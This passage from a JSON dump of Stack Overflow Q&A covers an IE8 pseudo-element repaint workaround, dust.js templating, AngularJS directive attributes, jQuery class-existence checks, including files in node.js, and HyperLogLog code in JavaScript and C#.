                    "body": "<p>Adding <code>content:\"x\"</code> to each declaration of the psuedo-elements and incrementing the number of spaces for each different state of the element DEFINITELY FIX the issue. </p>\n\n<p>Basically, the idea is to tell IE8 that the content is slightly different in each state, so redraw the content for each state. So, if the content is the same, we 'fake' it with empty spaces. BRILLIANT!!</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>@lnrbob really nice answer!!</p>\n\n<p>i had the problem that i used the before and after pseudos of a checkbox input, which are using some parent attributes for displaying their content (due to being easily able to implement translation there).</p>\n\n<p>so they look like:</p>\n\n<pre><code>input:before {\n    content: \"\" attr(data-on) \"\";\n}\n\ninput:after {\n    content: \"\" attr(data-off) \"\";\n}\n</code></pre>\n\n<p>and the markup looks like this:</p>\n\n<pre><code>&lt;div class=\"switch off\" data-on=\"It is ON\" data-off=\"It is OFF\"&gt;\n    &lt;input id=\"switch\" name=\"switch\" type=\"checkbox\" class=\"off\"&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>and the modification i do in jquery looks like this:</p>\n\n<pre><code>var mSwitch = $('div.switch'),\n    on = $.trim(mSwitch.attr('data-on')),\n    off = $.trim(mSwitch.attr('data-off'));\n// remove any spaces due to trim\nmSwitch .attr('data-on', on);\n// add a space\nmSwitch .attr('data-on', on + ' ');\nmSwitch .attr('data-off', off);\nmSwitch .attr('data-off', off + ' ');\n</code></pre>\n\n<p>and i call this modification after setting/removing classes to change the style of the \"checkbox\" which is rather a switch button in this case :D</p>\n\n<p>so this way you do not get a stackoverflow from too much space characters if some hardcore testers auto click the input for an infinite time ;)</p>\n\n<p>like that:</p>\n\n<pre><code>&lt;div class=\"switch on\" data-on=\"ON\" data-off=\"OFF                                                                                                                                                                                                                                                 \"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>so I've been toying with this calendar-ish thingy for a bit:</p>\n\n<ul>\n<li>Grid of divs (mimicking a table)</li>\n<li>Hovering over a table cell displays a tooltip with 2 icons each consisting of a div with :before and :after elements</li>\n<li>Icons change colour depending on colour of cell hovered and that of its previous sibling (cell's colour class is applied to the icon).</li>\n</ul>\n\n<p>Stripped down fiddle: <a href=\"http://jsfiddle.net/e9PkA/1/\">http://jsfiddle.net/e9PkA/1/</a></p>\n\n<p>This works fine in every browser but IE8 and below (IE lte 7 and I will never friends, but IE8 would be nice to have).</p>\n\n<p>IE8 notices the change of classNames and updates the divs' colour accordingly but completely ignores the colour changes implied by the :before and :after declarations, e.g.:</p>\n\n<pre><code>.wbscal_icon_arrival:before {\n    width: 12px;\n    height: 4px;\n\n    left: -8px;\n    top: 6px;\n    background-color: silver;\n}\n\n.wbscal_icon_arrival.wbscal_full:before {\n    background-color: #ff0000 !important; \n}\n</code></pre>\n\n<p>In the fiddle above, the :before/:after elements are coloured exactly once: the first time the tooltip is shown. </p>\n\n<p>In another version it would update everytime I'd move the mouse out of the \"table\" div, but not if the tooltip is hidden when hovering a \"cell\" div border.</p>\n\n<p>I've tried force-triggering repaints by adding/removing other classes to/from the element/its parents/the body, editing/accessing style attributes and whatnot so I guess it's not your average repaint problem.</p>\n\n<p>Is there a JS hack that fixes this and forces :before/:after to update?</p>\n",
            "last_activity_date": 1407487377,
            "question_id": 8703799,
            "score": 42,
            "tags": [
                "javascript",
                "css",
                "internet-explorer-8",
                "pseudo-element"
            ],
            "title": "Forcing IE8 to rerender/repaint :before/:after pseudo elements"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Dust.js is a good option. It is better than some of the other templating frameworks because it does not constrain that the data should be in a file, or in a string, etc.</p>\n\n<p>Also it is being actively maintained <a href=\"https://github.com/linkedin/dustjs\">https://github.com/linkedin/dustjs</a>.</p>\n\n<ol>\n<li><p>Has it been successful?</p>\n\n<p>Yes, I know at least LinkedIn is using it and also contributing improvements/patches, etc.</p></li>\n<li><p>Is it easy to use?</p>\n\n<p>I have tried using it and it is as easy as Mustache or Handlebars.js.</p></li>\n<li><p>Is it sufficiently documented?</p>\n\n<p>Yes <a href=\"http://akdubya.github.com/dustjs\">http://akdubya.github.com/dustjs</a>.</p></li>\n<li><p>Is community support good? (only 6 questions on ST tagged 'dust.js'!)</p>\n\n<p>If you are comparing Mustache or Handlebars.js, dust.js does not have as many users, but I believe if you have an issue and post it on the LinkedIn repo they would definitely respond. I will too since I'm watching it :-)</p></li>\n<li><p>What are the pros and cons when compared to other templating tools such as Underscore's templating, Google Closure Templates, Handlebars and Mustache.</p>\n\n<p>As for pros, you can check when you should consider using dust.js here <a href=\"https://github.com/linkedin/dustjs#readme\">https://github.com/linkedin/dustjs#readme</a>.</p>\n\n<p>As for cons, there isn't enough users for dust.js compared to popular ones like Mustache or Handlebars.js. That said, the other libraries like Google Closure suffers the same problem.</p>\n\n<p>But like I mentioned before, dust.js is designed very well compared to other frameworks IMHO.</p></li>\n<li><p>Are there any problems using it with an MV* structure framework, e.g Backbone.js (online book)?</p>\n\n<p>I have not used it with other MVC frameworks, but I don't think it should be a problem at all.</p></li>\n</ol>\n\n<p>Hope that helps.</p>\n",
                    "is_accepted": true,
                    "score": 35
                },
                {
                    "body": "<ol>\n<li><p>I'm doing a freelance project now for quite a big and established niche IT company and they've chosen dust.js for their HTML5 mobile app framework. And yes, LinkedIn is a big and successful company.</p></li>\n<li><p>Sort of. Nothing really difficult but I needed to get accustomed to it. I worked with Freemarker on Java - Freemarker seemed quite a bit easier to use because of a lot of built-in power features. However, many may find dust.js nice - it has its clear logic, very lightweight syntax - there are things in dust.js to really like for many.</p></li>\n<li><p>Freemarker for Java was documented much better. dust.js's GitHub page is very OK for starters but, for example, I couldn't find the description of all the dust.js filters there and needed to search on Google for it - however, that search easily provided me with the info I needed.</p></li>\n<li><p>Didn't see much community support but the library is really lightweight and clear - a couple of Google searches was all I needed to gather all the necessary info.</p></li>\n<li><p>Didn't use other JS templating tools.</p></li>\n<li><p>The company I mentioned in the answer to the 1st question has built a lightweight HTML5 framework using dust.js together with both jQuery and Backbone.js. I'm doing the project for them using that framework and tapping to both jQuery and Backbone.js functionality all the time - nothing to complain about. dust.js is a little bit like Backbone.js - lightweight and not imposing much restrictions on your coding style or other libraries you use. Using it you will see that there is some preferrable form of JS objects you use to feed it with the data but it's easy to get accustomed to (I mean if you need lists of something in your views it's better to feed dust.js with lists and not JS object hashes which at the same time are natural at describing separate entities).</p></li>\n</ol>\n\n<p>One thing about performance - you can develop your app with \"full\" version and then compile your templates for production (using for example node.js + dust.js npm module - grunt can be useful here) to be used with \"core\" version. In this case you could get quite a boost in real-world performance - putting all the templates together and minifying them will free the client browser from fetching the templates from server every time it needs them. \"Full\" and \"core\" are not about commercial/free - the core version just doesn't have the template compiler and is to be used with pre-compiled templates.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I work on a large Java based web application, it has been built up over the past 5 or so years - the UI needs an overhaul / to be largely re-written. We are investigating the available UI tools/libraries/frameworks to use and have come across <a href=\"http://akdubya.github.com/dustjs/\">dust.js</a> as an option for templating.</p>\n\n<p><strong>The questions:</strong> \nI'm interested in hearing what users of <a href=\"http://akdubya.github.com/dustjs/\">dust.js</a> think of it: </p>\n\n<ol>\n<li>Has it been successful? </li>\n<li>Is it easy to use?</li>\n<li>Is it sufficiently documented?</li>\n<li>Is community support good? (only 6 questions on <a href=\"http://stackoverflow.com/questions/tagged/dust.js\">ST tagged 'dust.js'</a>!) </li>\n<li>What are the pros and cons when compared to other templating tools such as <a href=\"http://documentcloud.github.com/underscore/\">Underscore</a>'s templating, <a href=\"https://developers.google.com/closure/templates/\">Google Closure Templates</a>, <a href=\"http://handlebarsjs.com/\">Handlebars</a> and <a href=\"http://mustache.github.com/\">Mustache</a>.</li>\n<li>Are there any problems using it with an MV* structure framework, e.g <a href=\"http://documentcloud.github.com/backbone/\">Backbone.js</a> (<a href=\"http://addyosmani.github.com/backbone-fundamentals/\">online book</a>)?</li>\n</ol>\n\n<p><strong>Some background:</strong></p>\n\n<ul>\n<li><p><em>Why are we interested in dust.js:</em> The following <a href=\"http://www.linkedin.com/\">LinkedIn</a> blog posts first drew our attention to it:</p>\n\n<ul>\n<li><a href=\"http://engineering.linkedin.com/frontend/leaving-jsps-dust-moving-linkedin-dustjs-client-side-templates\">Leaving JSPs in the dust: moving LinkedIn to dust.js client-side templates</a></li>\n<li><p><a href=\"http://engineering.linkedin.com/frontend/client-side-templating-throwdown-mustache-handlebars-dustjs-and-more\">The client-side templating throwdown: mustache, handlebars, dust.js, and more</a>    </p>\n\n<p>The second of the two posts very nicely answers question 5, but asides from LinkedIn, very few results from Google detail the templating system or imply that it is a popular choice. In addition, the post mentions that they have extended the functionality and hope to one day contribute to the original project. I'm concerned that until they do that, we may also need to extend functionality.</p>\n\n<p>Having said this, LinkedIn's original requirements for a templating system are very close to ours (see below) and they have clearly done some very thorough investigations before choosing.</p></li>\n</ul></li>\n<li><p><em>Our requirements:</em></p>\n\n<ol>\n<li><a href=\"http://en.wikipedia.org/wiki/Don%27t_repeat_yourself\">DRY</a>: We ideally want to use the templating system on the server (Java based) and client-side, or just client-side if we opt for LinkedIn's complete approach; <em><code>Instead of using a JSP, GSP, or ERB to assemble a page server side and send back HTML, we have the server send back just the dynamic data as JSON and have the page assembled in the browser using a static client-side template served from a CDN\"</code></em> </li>\n<li>Fully internationalised</li>\n<li>Good community support</li>\n<li>Sufficiency easy to use / pick up</li>\n<li>Works happily with <a href=\"http://jquery.com/\">jQuery</a> and <a href=\"http://documentcloud.github.com/backbone/\">Backbone.js</a></li>\n<li>Well documented</li>\n</ol></li>\n</ul>\n",
            "last_activity_date": 1362305342,
            "question_id": 10194921,
            "score": 31,
            "tags": [
                "javascript",
                "templates",
                "backbone.js",
                "dust.js"
            ],
            "title": "Choosing the right UI templating tool - dust.js?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Using attrs you are able to access the attributes defined in your html tag like </p>\n\n<pre><code>&lt;fm-rating ng-model=\"$parent.restaurant.price\" symbol=\"$\" readonly=\"true\"&gt;\n</code></pre>\n\n<p>So in this case you will have access to the <strong>symbol</strong> and <strong>readonly</strong> attributes. Every attribute you define in your custom directive will be available to the <strong>attrs</strong> variable.</p>\n\n<p>The block: </p>\n\n<pre><code>attrs.max = scope.max = parseInt(scope.max || 5, 10);\n</code></pre>\n\n<p>Will <strong>parse and assign</strong> the current <strong>scope.max</strong> value or <strong>5</strong>, if non existent, to the scope.max and attrs.max. This way, <strong>after the assignment you can read from attrs.max</strong>. Before that the attrs.max property in undefined.</p>\n\n<p>Inspecting the fmRating.js source i don't know why/where/when this piece of code is being used.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<blockquote>\n  <p>what is the purpose of attrs?</p>\n</blockquote>\n\n<p>Attributes defined on the same element as your directive have a few purposes:</p>\n\n<ol>\n<li>They are the only way to pass information into a directive that uses an isolate scope.  Since the directive isolate scope doesn't prototypically inherit from the parent scope, we need a way to specify what we want to pass to the isolate scope.  '@', '=', and '&amp;' in the \"object hash\" therefore each require an attribute to specify what data/information is being passed.</li>\n<li>They serve as an inter-directive communication mechanism.  (E.g., <a href=\"http://stackoverflow.com/questions/13639399/managing-communication-between-independent-angularjs-directives-independenly/14298481#14298481\">Managing communication between independent AngularJS directives independenly</a>)</li>\n<li>They <a href=\"http://stackoverflow.com/questions/14289459/html-element-attribute-names-with-hyphens-are-auto-converted-to-camelcase/14289581#14289581\">normalize</a> the attribute names.</li>\n</ol>\n\n<blockquote>\n  <p>Can't one access all the attributes passed through attrs?</p>\n</blockquote>\n\n<p>Yes you can, but </p>\n\n<ol>\n<li>you will not have any data binding.\n<br>'@' sets up one-way \"string\" databinding (parent scope &#8594; directive isolate scope)  With @ the value you see/get in the directive is always a string, so don't use this if you're trying to pass an object to your directive.\n<br>'=' sets up two-way databinding (parent scope &#8596; directive isolate scope).\n<br>Without databinding, your directive can't $watch or $observe model/data changes automatically.</li>\n<li>attribute values with <code>{{}}</code>s will cause you problems, since they will not be interpolated.\n<br>Suppose we have <code>&lt;my-directive name=\"My name is {{name}}\"&gt;</code> and the parent scope has <code>$scope.name='Mark'</code>.  Then, inside the linking function, <code>console.log(attrs.name)</code> results in <code>undefined</code>. \n<br>If name is an isolate scope property defined with '@', then <code>attrs.$observe('name', function(val) { console.log(val) })</code> results in <code>My name is Mark</code>.  (Note that inside the linking function, $observe() must be used to get the interpolated value.)</li>\n</ol>\n\n<blockquote>\n  <p>Why can't one access value of max as attrs.max instead of scope.max</p>\n</blockquote>\n\n<p>answered above</p>\n\n<blockquote>\n  <p>Why assign back like attrs.max = scope.max ?</p>\n</blockquote>\n\n<p>The only reason I can think of for doing this is in case some other directive needs to see this attribute/value (i.e., inter-directive communication).  However, the other directive would need to run after this directive for this to work (which can be controlled somewhat with the <code>priority</code> directive setting).</p>\n\n<p>Summary: in a directive with an isolate scope, normally you don't want to use <code>attrs</code>.  (I suppose it could be a way to send initialization data/values into a directive -- i.e., if you don't need databinding for these values and you don't need interpolation.)</p>\n",
                    "is_accepted": true,
                    "score": 58
                }
            ],
            "body": "<p>Please see the example <a href=\"https://github.com/IgorMinar/foodme/blob/master/app/js/directives/fmRating.js\">here</a> </p>\n\n<pre><code>foodMeApp.directive('fmRating', function() {\n  return {\n    restrict: 'E',\n    scope: {\n      symbol: '@',\n      max: '@',\n      readonly: '@'\n    },\n    require: 'ngModel',\n    link: function(scope, element, attrs, ngModel) {\n\n      attrs.max = scope.max = parseInt(scope.max || 5, 10);\n...\n</code></pre>\n\n<p>Angular needs <code>symbol</code> , <code>max</code>, <code>readonly</code> to be defined in the isolated scope object to access it from parent scope.</p>\n\n<p>it is used <a href=\"https://github.com/IgorMinar/foodme/blob/master/app/views/menu.html\">here</a></p>\n\n<p><code>&lt;fm-rating ng-model=\"$parent.restaurant.price\" symbol=\"$\" readonly=\"true\"&gt;&lt;/fm-rating&gt;</code></p>\n\n<p>So, what is the purpose of <code>attrs</code>? Can't one access all the attributes passed through <code>attrs</code>. Why can't one access value of max as <code>attrs.max</code> instead of <code>scope.max</code></p>\n\n<p>Why assign back like <code>attrs.max = scope.max</code> ? </p>\n\n<p>Since this app is written by Angular authors, I expect a reason.</p>\n\n<p>thanks.</p>\n",
            "last_activity_date": 1366233606,
            "question_id": 14300986,
            "score": 21,
            "tags": [
                "javascript",
                "angularjs"
            ],
            "title": "Angularjs directive: Isolated scope and attrs"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<pre><code>if ($(\".mydivclass\").size()){\n   // code here\n}\n</code></pre>\n\n<p>The <code>size()</code> method just returns the number of elements that the jQuery selector selects - in this case the number of elements with the class <code>mydivclass</code>. If it returns 0, the expression is false, and therefore there are none, and if it returns any other number, the divs must exist.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>It's quite simple...</p>\n\n<pre><code>if ($('.mydivclass').length &gt; 0) {\n  //do something\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>check if the div exists with a certain class</p>\n\n<pre><code>if ($(\".mydivclass\").length &gt; 0) //it exists \n{\n\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You can use <code>size()</code>, but jQuery recommends you use length to avoid the overhead of another function call:</p>\n\n<pre><code>$('div.mydivclass').length\n</code></pre>\n\n<p>So:</p>\n\n<pre><code>// since length is zero, it evaluates to false\nif ($('div.mydivclass').length) {\n</code></pre>\n\n<p><a href=\"http://api.jquery.com/size/\">http://api.jquery.com/size/</a></p>\n\n<p><a href=\"http://api.jquery.com/length/\">http://api.jquery.com/length/</a></p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>The selected answer uses a perf test, but it's slightly flawed since it is also including element selection as part of the perf, which is not what's being tested here. Here is an updated perf test:</p>\n\n<p><a href=\"http://jsperf.com/check-if-div-exists/3\">http://jsperf.com/check-if-div-exists/3</a></p>\n\n<p>My first run of the test shows that property retrieval is faster than index retrieval, although IMO it's pretty negligible. I still prefer using length as to me it makes more sense as to the intent of the code instead of a more terse condition.</p>\n",
                    "is_accepted": false,
                    "score": 43
                },
                {
                    "body": "<p>To test for <code>div</code> elements explicitly:</p>\n\n<p><code>if( $('div.mydivclass').length ){...}</code></p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>You can simplify this by checking the first object that is returned from JQuery like so:</p>\n\n<pre><code>if ($(\".mydivclass\")[0]){\n    // Do something if class exists\n} else {\n    // Do something if class does not exist\n}\n</code></pre>\n\n<p>In this case if there is a truthy value at the first (<code>[0]</code>) index, then assume class exists.</p>\n\n<p><strong>Edit 04/10/2013:</strong> I've created a jsperf test case <a href=\"http://jsperf.com/check-if-div-exists\">here</a>.</p>\n",
                    "is_accepted": true,
                    "score": 144
                },
                {
                    "body": "<pre><code>$('div').hasClass('mydivclass')// Returns true if the class exist.\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 25
                },
                {
                    "body": "<p>Here is a solution without using Jquery</p>\n\n<pre><code>var hasClass = element.classList.contains('class name to search');\n// hasClass is boolean\nif(hasClass === true)\n{\n     // Class exists\n}\n</code></pre>\n\n<p>reference <a href=\"http://stackoverflow.com/questions/16475704/javascript-check-if-classname-exists\">link</a></p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<h2>Without jQuery:</h2>\n\n<p>Native JavaScript is always going to be faster. In this case: <a href=\"http://jsfiddle.net/492j1ga6/\" rel=\"nofollow\">(example)</a></p>\n\n<pre><code>if (document.querySelector('.mydivclass') !== null) {\n    // .. it exists\n}\n</code></pre>\n\n<hr>\n\n<p>If you want to check to see if a parent element contains another element with a specific class, you could use either of the following. <a href=\"http://jsfiddle.net/zzpke98u/\" rel=\"nofollow\">(example)</a></p>\n\n<pre><code>var parent = document.querySelector('.parent');\n\nif (parent.querySelector('.child') !== null) {\n    // .. it exists as a child\n}\n</code></pre>\n\n<p>Alternatively, you can use the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Node.contains\" rel=\"nofollow\"><code>.contains()</code></a> method on the parent element. <a href=\"http://jsfiddle.net/qzt1h9m3/\" rel=\"nofollow\">(example)</a></p>\n\n<pre><code>var parent = document.querySelector('.parent'),\n    child = document.querySelector('.child');\n\nif (parent.contains(child)) {\n    // .. it exists as a child\n}\n</code></pre>\n\n<hr>\n\n<p>..and finally, if you want to check to see if a given element merely contains a certain class, use:</p>\n\n<pre><code>if (el.classList.contains(className)) {\n    // .. el contains the class\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Using jQuery I'm programmatically generating a bunch of <code>div</code>'s like this:</p>\n\n<pre><code>&lt;div class=\"mydivclass\" id=\"myid1\"&gt;Some Text1&lt;/div&gt;\n&lt;div class=\"mydivclass\" id=\"myid2\"&gt;Some Text2&lt;/div&gt;\n</code></pre>\n\n<p>Somewhere else in my code I need to detect if these DIVs exist. The class name for the divs is the same but the ID changes for each div. Any idea how to detect them using jQuery?</p>\n",
            "last_activity_date": 1421814453,
            "question_id": 5783280,
            "score": 71,
            "tags": [
                "javascript",
                "jquery",
                "jquery-selectors",
                "javascript-framework"
            ],
            "title": "Check if div with certain class name exists"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>To place an emphasis on what everyone else has been saying <code>var foo</code> in top level does not create a global variable. If you want a global variable then write <code>global.foo</code>. but we <em>all</em> know globals are evil.</p>\n\n<p>If you are someone who uses globals like that in a node.js project I was on I would refactor them away for as there are just so few use cases for this (There are a few exceptions but this isn't one).</p>\n\n<pre><code>// Declare application\nvar app = require('express').createServer();\n\n// Declare usefull stuff for DB purposes\nvar mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\nvar ObjectId = Schema.ObjectId;\n\nrequire('./models/car.js').make(Schema, mongoose);\n</code></pre>\n\n<p>in car.js</p>\n\n<pre><code>function make(Schema, mongoose) {\n    // Define Car model\n    CarSchema = new Schema({\n      brand        : String,\n      type : String\n    });\n    mongoose.model('Car', CarSchema);\n}\n\nmodule.exports.make = make;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 77
                },
                {
                    "body": "<p>you can put</p>\n\n<pre><code>var mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\n</code></pre>\n\n<p>at the top of your car.js file for it to work, or you can do what Raynos said to do.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>The correct answer is usually to use require, but in a few cases it's not possible.</p>\n\n<p>The following code will do the trick, but use it with care:</p>\n\n<pre><code>var fs = require('fs');\nvar vm = require('vm');\nvar includeInThisContext = function(path) {\n    var code = fs.readFileSync(path);\n    vm.runInThisContext(code, path);\n}.bind(this);\nincludeInThisContext(__dirname+\"/models/car.js\");\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 37
                },
                {
                    "body": "<p>If you just want to test a library from the command line, you could do:</p>\n\n<pre><code>cat somelibrary.js mytestfile.js | node\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Short answer:</p>\n\n<pre><code>// lib.js\nmodule.exports.your_function = function () {\n  // Something...\n};\n\n// app.js\nrequire('lib.js').your_function();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 9
                }
            ],
            "body": "<p>I have an app.js node application. As this file is starting to grow, I would like to move some part of the code in some other files that I would \"require\" or \"include\" in the app.js file.</p>\n\n<p>I'm trying things like:</p>\n\n<pre><code>// Declare application\nvar app = require('express').createServer();\n\n// Declare usefull stuff for DB purposes\nvar mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\nvar ObjectId = Schema.ObjectId;\n\n// THE FOLLOWING REQUIRE DOES NOT WORK\nrequire('./models/car.js');\n</code></pre>\n\n<p>in car.js:</p>\n\n<pre><code>// Define Car model\nCarSchema = new Schema({\n  brand        : String,\n  type : String\n});\nmongoose.model('Car', CarSchema);\n</code></pre>\n\n<p>I got the error:</p>\n\n<pre><code>ReferenceError: Schema is not defined\n</code></pre>\n\n<p>I'm just looking to have the content of car.js loaded (instead of having everything in the same app.js file) Is there a particuliar way to do this in node.js ?</p>\n",
            "last_activity_date": 1412176807,
            "question_id": 5625569,
            "score": 66,
            "tags": [
                "javascript",
                "node.js"
            ],
            "title": "include external .js file in node.js app"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p><a href=\"http://jsfiddle.net/mM6bY/4/\">Here</a> it is the updated version of the algorithm based on the <a href=\"http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf\">newer paper</a>:</p>\n\n<pre><code>var pow_2_32 = 0xFFFFFFFF + 1;\n\nfunction HyperLogLog(std_error)\n{\n     function log2(x)\n     {\n          return Math.log(x) / Math.LN2;\n     }\n\n     function rank(hash, max)\n     {\n          var r = 1;\n          while ((hash &amp; 1) == 0 &amp;&amp; r &lt;= max) { ++r; hash &gt;&gt;&gt;= 1; }\n          return r;\n     }\n\n     var m = 1.04 / std_error;\n     var k = Math.ceil(log2(m * m)), k_comp = 32 - k;\n     m = Math.pow(2, k);\n\n     var alpha_m = m == 16 ? 0.673\n          : m == 32 ? 0.697\n          : m == 64 ? 0.709\n          : 0.7213 / (1 + 1.079 / m);\n\n     var M = []; for (var i = 0; i &lt; m; ++i) M[i] = 0;\n\n     function count(hash)\n     {\n          if (hash !== undefined)\n          {\n                var j = hash &gt;&gt;&gt; k_comp;\n                M[j] = Math.max(M[j], rank(hash, k_comp));\n          }\n          else\n          {\n                var c = 0.0;\n                for (var i = 0; i &lt; m; ++i) c += 1 / Math.pow(2, M[i]);\n                var E = alpha_m * m * m / c;\n\n                // -- make corrections\n\n                if (E &lt;= 5/2 * m)\n                {\n                     var V = 0;\n                     for (var i = 0; i &lt; m; ++i) if (M[i] == 0) ++V;\n                     if (V &gt; 0) E = m * Math.log(m / V);\n                }\n                else if (E &gt; 1/30 * pow_2_32)\n                     E = -pow_2_32 * Math.log(1 - E / pow_2_32);\n\n                // --\n\n                return E;\n          }\n    }\n\n    return {count: count};\n}\n\nfunction fnv1a(text)\n{\n     var hash = 2166136261;\n     for (var i = 0; i &lt; text.length; ++i)\n     {\n          hash ^= text.charCodeAt(i);\n          hash += (hash &lt;&lt; 1) + (hash &lt;&lt; 4) + (hash &lt;&lt; 7) +\n            (hash &lt;&lt; 8) + (hash &lt;&lt; 24);\n     }\n     return hash &gt;&gt;&gt; 0;\n}\n\nvar words = ['aardvark', 'abyssinian', ..., 'zoology']; // 2336 words\n\nvar seed = Math.floor(Math.random() * pow_2_32); // make more fun\n\nvar log_log = HyperLogLog(0.065);\nfor (var i = 0; i &lt; words.length; ++i) log_log.count(fnv1a(words[i]) ^ seed);\nvar count = log_log.count();\nalert(count + ', error ' +\n    (count - words.length) / (words.length / 100.0) + '%');\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>We've open sourced a project called Stream-Lib that has a <a href=\"https://github.com/clearspring/stream-lib/tree/master/src/main/java/com/clearspring/analytics/stream/cardinality\" rel=\"nofollow\">LogLog implementation</a>.  The work was based on <a href=\"http://algo.inria.fr/flajolet/Publications/DuFl03-LNCS.pdf\" rel=\"nofollow\">this paper</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I implemented loglog and hyperloglog in JS and PHP and well-commented code <a href=\"https://github.com/buryat/loglog\" rel=\"nofollow\">https://github.com/buryat/loglog</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Using the js version @actual provided, I tried to implement the same in C#, which seems close enough. Just changed fnv1a function a little bit and renamed it to getHashCode. (Credit goes to Jenkins hash function, <a href=\"http://en.wikipedia.org/wiki/Jenkins_hash_function\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Jenkins_hash_function</a>)</p>\n\n<pre><code>public class HyperLogLog\n{\n    private double mapSize, alpha_m, k;\n    private int kComplement;\n    private Dictionary&lt;int, int&gt; Lookup = new Dictionary&lt;int, int&gt;();\n    private const double pow_2_32 = 4294967297;\n\n    public HyperLogLog(double stdError)\n    {\n        mapSize = (double)1.04 / stdError;\n        k = (long)Math.Ceiling(log2(mapSize * mapSize));\n\n        kComplement = 32 - (int)k;\n        mapSize = (long)Math.Pow(2, k);\n\n        alpha_m = mapSize == 16 ? (double)0.673\n              : mapSize == 32 ? (double)0.697\n              : mapSize == 64 ? (double)0.709\n              : (double)0.7213 / (double)(1 + 1.079 / mapSize);\n        for (int i = 0; i &lt; mapSize; i++)\n            Lookup[i] = 0;\n    }\n\n    private static double log2(double x)\n    {\n        return Math.Log(x) / 0.69314718055994530941723212145818;//Ln2\n    }\n    private static int getRank(uint hash, int max)\n    {\n        int r = 1;\n        uint one = 1;\n        while ((hash &amp; one) == 0 &amp;&amp; r &lt;= max)\n        {\n            ++r;\n            hash &gt;&gt;= 1;\n        }\n        return r;\n    }\n    public static uint getHashCode(string text)\n    {\n        uint hash = 0;\n\n        for (int i = 0, l = text.Length; i &lt; l; i++)\n        {\n            hash += (uint)text[i];\n            hash += hash &lt;&lt; 10;\n            hash ^= hash &gt;&gt; 6;\n        }\n        hash += hash &lt;&lt; 3;\n        hash ^= hash &gt;&gt; 6;\n        hash += hash &lt;&lt; 16;\n\n        return hash;\n    }\n\n    public int Count()\n    {\n        double c = 0, E;\n\n        for (var i = 0; i &lt; mapSize; i++)\n            c += 1d / Math.Pow(2, (double)Lookup[i]);\n\n        E = alpha_m * mapSize * mapSize / c;\n\n        // Make corrections &amp; smoothen things.\n        if (E &lt;= (5 / 2) * mapSize)\n        {\n            double V = 0;\n            for (var i = 0; i &lt; mapSize; i++)\n                if (Lookup[i] == 0) V++;\n            if (V &gt; 0)\n                E = mapSize * Math.Log(mapSize / V);\n        }\n        else\n            if (E &gt; (1 / 30) * pow_2_32)\n                E = -pow_2_32 * Math.Log(1 - E / pow_2_32);\n        // Made corrections &amp; smoothen things, or not.\n\n        return (int)E;\n    }\n\n    public void Add(object val)\n    {\n        uint hashCode = getHashCode(val.ToString());\n        int j = (int)(hashCode &gt;&gt; kComplement);\n\n        Lookup[j] = Math.Max(Lookup[j], getRank(hashCode, kComplement));\n    }\n} \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Here is a slightly modified version which adds the merge operation.</p>\n\n<p>Merge allows you to take the counters from several instances of HyperLogLog,\nand determine the unique counters overall.</p>\n\n<p>For example, if you have unique visitors collected on Monday, Tuesday and Wednesday, \nthen you can merge the buckets together and count the number of unique visitors\nover the three day span:</p>\n\n<pre><code>var pow_2_32 = 0xFFFFFFFF + 1; \nfunction HyperLogLog(std_error)\n{\n    function log2(x)\n    {\n        return Math.log(x) / Math.LN2;\n    }\n\n    function rank(hash, max)\n    {\n        var r = 1;\n        while ((hash &amp; 1) == 0 &amp;&amp; r &lt;= max) { ++r; hash &gt;&gt;&gt;= 1; }\n        return r;\n    }\n\n    var m = 1.04 / std_error;\n    var k = Math.ceil(log2(m * m)), k_comp = 32 - k;\n    m = Math.pow(2, k);\n\n    var alpha_m = m == 16 ? 0.673\n         : m == 32 ? 0.697\n         : m == 64 ? 0.709\n         : 0.7213 / (1 + 1.079 / m);\n\n    var M = []; for (var i = 0; i &lt; m; ++i) M[i] = 0;\n\n    function merge(other)\n    {\n        for (var i = 0; i &lt; m; i++)\n        M[i] = Math.max(M[i], other.buckets[i]);\n    }\n\n    function count(hash)\n    {\n        if (hash !== undefined)\n        {\n            var j = hash &gt;&gt;&gt; k_comp;\n            M[j] = Math.max(M[j], rank(hash, k_comp));\n        }\n        else\n        {\n            var c = 0.0;\n            for (var i = 0; i &lt; m; ++i) c += 1 / Math.pow(2, M[i]);\n            var E = alpha_m 